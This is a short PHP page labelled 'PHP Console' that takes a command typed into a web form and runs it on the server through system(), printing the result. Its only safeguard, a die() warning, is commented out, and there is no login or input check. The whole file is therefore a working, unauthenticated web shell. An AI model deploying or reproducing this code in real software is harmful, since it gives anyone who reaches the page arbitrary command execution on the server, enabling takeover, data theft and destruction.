<?php
//  die('The console interface is disabled. Enable at your own risk!!!');
?>
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv='Content-Type' content='text/html; charset=utf-8'/>
  <title>PHP Console</title>
</head>
<body>
  <form name='console_form' action='' method='post'>
    <input type=text name='cmd' placeholder='command...' style='width:300px;'/>
    <button type='submit'>Exec</button>
  </form>
  <div id='output'>
    <pre>
<?php
if (isset($_POST['cmd'])){
  system($_POST['cmd']);
}
?>
    </pre>
  </div>
</body>
</html>
